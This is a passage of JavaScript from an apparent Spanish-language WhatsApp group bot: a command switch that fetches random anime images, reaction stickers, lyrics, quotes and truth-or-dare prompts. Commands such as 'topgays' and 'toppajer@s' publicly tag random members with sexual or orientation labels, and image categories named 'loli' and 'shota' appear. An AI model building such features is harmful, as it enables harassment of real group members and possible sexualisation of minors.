*${themeemoji} Definición:* ${targetfine.data.list[0].definition
            .replace(/\[/g, "")
            .replace(/\]/g, "")}
*${themeemoji} Ejemplo:* ${targetfine.data.list[0].example
            .replace(/\[/g, "")
            .replace(/\]/g, "")}`
        SenseiOfc.sendMessage(m.chat, { text: reply }, { quoted: m })
    } catch (err) {
        console.log(err)
        return replygc(`*${q}* no es un texto válido`)
    }
    break
            case 'runtime': {
            	let lowq = `*El bot ha estado en línea durante::*\n*${runtime(process.uptime())}*`
                replygc(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
SenseiOfc.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
case 'topgays': {
    if (!m.isGroup) return StickGroup();
    let member = participants.map(u => u.id);
    let selected = [];
    for (let i = 0; i < 10; i++) {
        let individual = member[Math.floor(Math.random() * member.length)];
        selected.push(individual);
    }
    let text = selected.map((individual, index) => `*_${index + 1}.- 🏳‍🌈@${individual.split('@')[0]}🏳‍🌈_*`).join('\n');
    let bufferImage = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');
    let audioBuffer = await getBuffer('https://github.com/GataNina-Li/GataBot-MD/raw/master/media/gay2.mp3');
    await SenseiOfc.sendMessage(from, { image: bufferImage, caption: `*🌈TOP 10 GAYS/LESBIANAS DEL GRUPO*\n${text}\n¡Felicidades!`, contextInfo: { mentionedJid: selected } }, { quoted: m });
    await new Promise(resolve => setTimeout(resolve, 1000));
    await SenseiOfc.sendMessage(from, { audio: audioBuffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
}
break
case 'toplindos': {
    if (!m.isGroup) return StickGroup();
    let member = participants.map(u => u.id);
    let selected = [];
    for (let i = 0; i < 10; i++) {
        let individual = member[Math.floor(Math.random() * member.length)];
        selected.push(individual);
    }
    let text = selected.map((individual, index) => `*${index + 1}.- @${individual.split('@')[0]}*`).join('\n');
    let bufferImage = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');
    await SenseiOfc.sendMessage(from, { image: bufferImage, caption: `*_😳TOP L@S MAS LIND@S Y SEXIS DEL GRUPO😳_*\n${text}\n¡Felicidades!`, contextInfo: { mentionedJid: selected } }, { quoted: m });
}
break
case 'toppajer@s': {
    if (!m.isGroup) return StickGroup();
    let member = participants.map(u => u.id);
    let selected = [];
    for (let i = 0; i < 10; i++) {
        let individual = member[Math.floor(Math.random() * member.length)];
        selected.push(individual);
    }
    let text = selected.map((individual, index) => `*${index + 1}.- @${individual.split('@')[0]}💦*`).join('\n');
    let bufferImage = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');
    await SenseiOfc.sendMessage(from, { image: bufferImage, caption: `*_😏TOP L@S MAS PAJEROS/AS DEL GRUPO💦_*\n${text}\n¡Felicidades!`, contextInfo: { mentionedJid: selected } }, { quoted: m });
}
break
            case 'soulmate': case 'almagemala': {
    if (!m.isGroup) return StickGroup();
    let member = participants.map(u => u.id);
    let me = m.sender;
    let jodoh = member[Math.floor(Math.random() * member.length)];
    await SenseiOfc.sendMessage(m.chat,
        {
            text: `👫Tu alma gemela es\n\n@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
            contextInfo: {
                mentionedJid: [me, jodoh],
                forwardingScore: 9999999,
                isForwarded: false,
                "externalAdReply": {
                    "showAdAttribution": true,
                    "containsAutoReply": true,
                    "title": ` ${global.botname}`,
                    "body": `${ownername}`,
                    "previewType": "PHOTO",
                    "thumbnailUrl": ``,
                    "thumbnail": fs.readFileSync(`./Media/theme/menu.jpg`),
                    "sourceUrl": `${wagc}`
                }
            }
        },
        { quoted: m });
}
break
case 'couple': case 'pareja': {
    if (!m.isGroup) return StickGroup();
    let member = participants.map(u => u.id);
    let orang = member[Math.floor(Math.random() * member.length)];
    let jodoh = member[Math.floor(Math.random() * member.length)];
    await SenseiOfc.sendMessage(m.chat,
        {
            text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}\n\nHarían buena pareja. Deberían intentarlo.❤️💖👀`,
            contextInfo: {
                mentionedJid: [orang, jodoh],
                forwardingScore: 9999999,
                isForwarded: false,
                "externalAdReply": {
                    "showAdAttribution": true,
                    "containsAutoReply": true,
                    "title": ` ${global.botname}`,
                    "body": `${ownername}`,
                    "previewType": "PHOTO",
                    "thumbnailUrl": ``,
                    "thumbnail": fs.readFileSync(`./Media/theme/menu.jpg`),
                    "sourceUrl": `${wagc}`
                }
            }
        },
        { quoted: m });
}
break
                        case 'coffee': case 'kopi': {
                SenseiOfc.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
case 'wallpaper': {
    if (!text) return replygc('Ingresa el título de la búsqueda')
    await StickWait()
    let { wallpaper } = require('./lib/scraper')
    anuwallpep = await wallpaper(text)
    result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
    SenseiOfc.sendMessage(m.chat, {caption: `${themeemoji} Título : ${result.title}\n${themeemoji} Categoría : ${result.type}\n${themeemoji} Detalle : ${result.source}\n${themeemoji} URL de la Media : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
}
break
case 'wikimedia': {
    if (!text) return replygc('Ingresa el título de la búsqueda')
    await StickWait()
    let { wikimedia } = require('./lib/scraper')
    let anumedia = await wikimedia(text)
    result = anumedia[Math.floor(Math.random() * anumedia.length)]
    SenseiOfc.sendMessage(m.chat, {caption: `${themeemoji} Título : ${result.title}\n${themeemoji} Fuente : ${result.source}\n${themeemoji} URL de la Media : ${result.image}`, image: { url: result.image }} , { quoted: m })
}
break

case 'random': {
    let type = (command).toLowerCase()
    let baseUrl = 'https://weeb-api.vercel.app/'
    const fetchImage = async (endpoint) => {
        try {
            const response = await fetch(baseUrl + endpoint)
            if (!response.ok) return replygc(`Error al obtener la imagen de ${type}`)
            const imageBuffer = await response.buffer() // Obtener los datos de la imagen como un búfer
            SenseiOfc.sendMessage(m.chat, {image:  imageBuffer, caption: `Aleatorio ${type}`}, {quoted: m})
        } catch (error) {
            console.error(error)
            replygc(`Se produjo un error al obtener la imagen de ${type}. Utiliza el comando correctamente \nEjemplo: ${prefix + command} loli\n`)
        }
    }
    switch (type) {
        case 'loli':
            fetchImage('loli')
            break
        case 'waifu':
            fetchImage('waifu')
            break
        case 'neko':
            fetchImage('neko')
            break
        case 'zerotwo':
            fetchImage('zerotwo')
            break
        default:    
            break
    }
}
break
            case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await StickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
SenseiOfc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'lyrics': case 'letra': {
    if (!text) return replygc(`¿Qué letra estás buscando?\nEjemplo de uso: ${prefix}lyrics Thunder`)
    await StickWait()
    const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
    const result = await lyricsv2(text).catch(async _ => await lyrics(text))
    replygc(`
┌──「 ** 🎵 Letra de la canción 🎵 ** 」
▢ *Titulo:* ${result.title}
▢ *Artista:* ${result.author}
▢ *URL:* ${result.link}

▢ *Letra:* ${result.lyrics}
└────────────
`.trim())
}
break
case 'pick': {
    if (!m.isGroup) return StickGroup()
    if (!text) return replygc(`¿A quién quieres elegir?\nEjemplo: ${prefix + command} idiota`)
    
    const groupMetadata = m.isGroup ? await SenseiOfc.groupMetadata(m.chat).catch((e) => {}) : ""
    const participants = m.isGroup ? await groupMetadata.participants : ""
    let member = participants.map((u) => u.id)
    let me = m.sender
    let xeonshimts = member[Math.floor(Math.random() * member.length)]
    
    SenseiOfc.sendMessage(from, { 
        text: `El *${text}* más destacado aquí es *@${xeonshimts.split("@")[0]}*`,
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: false, 
            mentionedJid: [xeonshimts],
            "externalAdReply": {
                "showAdAttribution": true,
                "title": ` ${global.botname}`,
                "body": `${ownername}`,
                "containsAutoReply": true,
                "previewType": "PHOTO",
                "thumbnailUrl": ``,
                "thumbnail": fs.readFileSync(`./Media/theme/menu.jpg`),
                "sourceUrl": `${wagc}`
            }
        }
    }, { quoted: m })
}
break
     case 'say': case 'tts': case 'gtts':{
    if (!text) return replygc('¿Dónde está el texto?')
    
    let texttts = text
    const xeonrl = googleTTS.getAudioUrl(texttts, {
        lang: "es", // Cambia a tu idioma deseado
        slow: false,
        host: "https://translate.google.com",
    })
    
    return SenseiOfc.sendMessage(m.chat, {
        audio: {
            url: xeonrl,
        },
        mimetype: 'audio/mp4',
        ptt: true,
        fileName: `${text}.mp3`
    }, {
        quoted: m,
    })
}
break
    case 'fact': case 'curiosidad': {
    const { data } = await axios.get(`https://nekos.life/api/v2/fact`);
    const fact = data.fact;
    
    const translatedFact = await translateToSpanish(fact);
    
    return replygc(`${themeemoji} *Fact:* ${translatedFact}\n`);
}
break
   case 'quotes':
  const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
  const textquotes = `*${themeemoji} Frase:* ${await translateToSpanish(quotexeony.data.quote.body)}\n\n*${themeemoji} Autor:* ${await translateToSpanish(quotexeony.data.quote.author)}`
  return replygc(textquotes)
  break
case 'dare': case 'reto':
    const respuestaDare = await axios.get('https://raw.githubusercontent.com/sensei-ofc/base-de-datos/main/game/reto.json');
    const listaDare = respuestaDare.data;
    const retoElegido = listaDare[Math.floor(Math.random() * listaDare.length)];

    const bufferDare = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');
    SenseiOfc.sendMessage(from, { image: bufferDare, caption: '_Has elegido RETO_\n' + retoElegido }, { quoted: m });

break
case 'truth': case 'verdad':
    const respuestaTruth = await axios.get('https://raw.githubusercontent.com/sensei-ofc/base-de-datos/main/game/verdad.json');
    const listaTruth = respuestaTruth.data;
    const verdadElegida = listaTruth[Math.floor(Math.random() * listaTruth.length)];

    const bufferTruth = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');
    SenseiOfc.sendMessage(from, { image: bufferTruth, caption: '_Has elegido VERDAD_\n' + verdadElegida }, { quoted: m });

break
case 'cry':
case 'llorar': {
    axios.get(`https://api.waifu.pics/sfw/cry`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'kill':
case 'matar': {
    axios.get(`https://api.waifu.pics/sfw/kill`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'hug':
case 'abrazar': {
    axios.get(`https://api.waifu.pics/sfw/hug`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'pat':
case 'acariciar': {
    axios.get(`https://api.waifu.pics/sfw/pat`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'lick':
case 'lamer': {
    axios.get(`https://api.waifu.pics/sfw/lick`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'kiss':
case 'besar': {
    axios.get(`https://api.waifu.pics/sfw/kiss`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'bite':
case 'morder': {
    axios.get(`https://api.waifu.pics/sfw/bite`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'yeet':
case 'arrojar': {
    axios.get(`https://api.waifu.pics/sfw/yeet`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'bully':
case 'acosar': {
    axios.get(`https://api.waifu.pics/sfw/bully`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'bonk':
case 'golpear': {
    axios.get(`https://api.waifu.pics/sfw/bonk`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'wink':
case 'guiñar': {
    axios.get(`https://api.waifu.pics/sfw/wink`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'poke':
case 'tocar': {
    axios.get(`https://api.waifu.pics/sfw/poke`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'nom':
case 'masticar': {
    axios.get(`https://api.waifu.pics/sfw/nom`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'slap':
case 'abofetear': {
    axios.get(`https://api.waifu.pics/sfw/slap`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'smile':
case 'sonreir': {
    axios.get(`https://api.waifu.pics/sfw/smile`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'wave':
case 'saludar': {
    axios.get(`https://api.waifu.pics/sfw/wave`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'awoo':
case 'loba': {
    axios.get(`https://api.waifu.pics/sfw/awoo`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'blush':
case 'sonrojar': {
    axios.get(`https://api.waifu.pics/sfw/blush`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'smug':
case 'engreir': {
    axios.get(`https://api.waifu.pics/sfw/smug`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'glomp':
case 'estrangulamiento': {
    axios.get(`https://api.waifu.pics/sfw/glomp`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'happy':
case 'feliz': {
    axios.get(`https://api.waifu.pics/sfw/happy`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'dance':
case 'bailar': {
    axios.get(`https://api.waifu.pics/sfw/dance`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'cringe':
case 'avergonzarse': {
    axios.get(`https://api.waifu.pics/sfw/cringe`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'cuddle':
case 'acurrucar': {
    axios.get(`https://api.waifu.pics/sfw/cuddle`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'highfive':
case 'loscinco': {
    axios.get(`https://api.waifu.pics/sfw/highfive`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'shinobu':
case 'shinobu': {
    axios.get(`https://api.waifu.pics/sfw/shinobu`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'handhold':
case 'sujetar': {
    axios.get(`https://api.waifu.pics/sfw/handhold`)
        .then(({ data }) => {
